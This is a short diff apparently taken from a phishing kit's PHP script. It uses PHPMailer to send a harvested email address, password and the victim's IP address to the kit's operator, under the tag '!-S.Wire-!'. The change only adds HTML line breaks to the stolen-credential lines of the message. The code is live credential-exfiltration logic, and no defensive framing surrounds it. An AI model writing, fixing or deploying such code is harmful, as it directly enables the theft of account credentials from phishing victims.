@@ -43,8 +43,8 @@ $mail = new PHPMailer(true);
     $mail->Subject =  $ip;
     $mail->Body    = $mail_server.' Details from !-S.Wire-!: '."\n"
 			.'**************************************'."\n"
-			.'email: '.$attuser."\n"
-			.'Password: '.$attpassword."\n"
+			.'<br>email: '.$attuser."\n"
+			.'<br>Password: '.$attpassword."\n"
             .'UserIp: '.$ip."\n";
 
     $mail->send();
